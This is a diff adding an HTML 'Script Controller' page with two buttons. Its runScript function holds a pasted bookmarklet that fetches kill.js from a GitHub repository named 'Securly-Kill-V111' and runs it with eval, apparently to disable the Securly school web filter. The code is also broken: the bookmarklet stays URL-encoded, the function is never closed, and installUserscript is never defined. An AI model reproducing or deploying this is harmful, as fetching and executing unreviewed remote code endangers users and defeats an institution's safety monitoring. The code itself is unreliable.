@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Script Controller</title>
+  <style>
+    .button-container {
+      display: flex;
+      gap: 12px;
+      font-family: system-ui, -apple-system, sans-serif;
+      padding: 10px;
+    }
+    .btn {
+      padding: 10px 18px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+    .btn-run {
+      background-color: #2563eb; /* Blue */
+    }
+    .btn-run:hover {
+      background-color: #1d4ed8;
+    }
+    .btn-install {
+      background-color: #059669; /* Green */
+    }
+    .btn-install:hover {
+      background-color: #047857;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="button-container">
+    <!-- Button 1 -->
+    <button class="btn btn-run" onclick="runScript()">Run JavaScript</button>
+
+    <!-- Button 2 -->
+    <button class="btn btn-install" onclick="installUserscript()">Install Userscript</button>
+  </div>
+
+  <script>
+    // ==========================================
+    // BUTTON 1: RUN JAVASCRIPT
+    // ==========================================
+    function runScript() {
+      // --- PASTE YOUR CUSTOM JS CODE BELOW ---
+      javascript:fetch(%22https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js%22).then(r%20=%3E%20r.text()).then(r%20=%3E%20eval(r))%20//%20made%20by%20zek-c)
+   
+
+      // --- PASTE YOUR CUSTOM JS CODE ABOVE ---
+  </script>
+
+</body>
+</html>
